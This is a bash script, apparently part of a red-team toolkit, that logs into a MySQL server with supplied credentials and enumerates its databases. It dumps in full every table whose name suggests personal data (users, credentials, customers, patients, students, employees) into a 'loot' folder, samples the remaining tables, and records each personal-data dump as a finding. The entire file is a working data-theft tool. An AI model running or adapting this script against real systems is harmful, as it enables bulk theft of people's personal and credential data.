#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/../lib/common.sh"
parse_common_args "$@"
: "${WS:=$HOME/redteam-runs/probe}"
mkdir -p "$WS/loot/dbdump"
F="$WS/exploit/findings-raw.md"

DB_HOST="${EXTRA_ARGS[0]:-}"
DB_PORT="${EXTRA_ARGS[1]:-3306}"
DB_USER="${EXTRA_ARGS[2]:-}"
DB_PASS="${EXTRA_ARGS[3]:-}"
DBS_LIST="${EXTRA_ARGS[4]:-}"

[[ -n "$DB_HOST" && -n "$DB_USER" ]] || die "usage: mysql_dump.sh --target dummy -- <host> <port> <user> <pass> [dbs-csv]"

log "mysql chain: $DB_USER@$DB_HOST:$DB_PORT (creds via args, never hardcoded)"

require_tools mysql

OUT="$WS/loot/dbdump"
export MYSQL_PWD="$DB_PASS"

probe=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" --skip-ssl -N -e "SHOW DATABASES" 2>"$OUT/auth.err" || true)
if [[ -z "$probe" ]]; then
  echo "**mysql dump FAILED** auth/host restriction — see loot/dbdump/auth.err" >> "$F"
  exit 1
fi
echo "$probe" > "$OUT/databases.txt"
echo "mysql auth OK, databases: $(echo "$probe" | tr '\n' ' ')" >> "$F"

DBS="$DBS_LIST"
if [[ -z "$DBS" ]]; then
  DBS=$(echo "$probe" | grep -vE "^(information_schema|performance_schema|mysql|sys)$" | tr '\n' ',')
fi

IFS=',' read -r -a DBARR <<< "$DBS"
for db in "${DBARR[@]}"; do
  [[ -z "$db" ]] && continue
  tables=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" --skip-ssl -N -e "SHOW TABLES FROM \`$db\`" 2>/dev/null || true)
  while IFS= read -r t; do
    [[ -z "$t" ]] && continue
    if echo "$t" | grep -qiE "user|cred|customer|token|subscriber|registration|account|client|employee|patient|student"; then
      mysqldump --skip-ssl -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" --skip-triggers \
        --no-create-info --single-transaction --quick "$db" "$t" > "$OUT/FULL-$db.$t.sql" 2>>"$OUT/dump.err" || true
      if grep -q "Dump completed" "$OUT/FULL-$db.$t.sql" 2>/dev/null; then
        echo "**FULL PII dump** $db.$t ($(wc -c < "$OUT/FULL-$db.$t.sql")B)" >> "$F"
      else
        rm -f "$OUT/FULL-$db.$t.sql"
      fi
    else
      mysqldump --skip-ssl -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" --skip-triggers \
        --no-create-info --single-transaction --quick --where "1=1 LIMIT 200" "$db" "$t" > "$OUT/SAMPLE-$db.$t.sql" 2>>"$OUT/dump.err" || true
    fi
  done <<< "$tables"
done

echo "mysql dump complete → loot/dbdump/" >> "$F"
logcheck "mysql_dump" "$OUT"
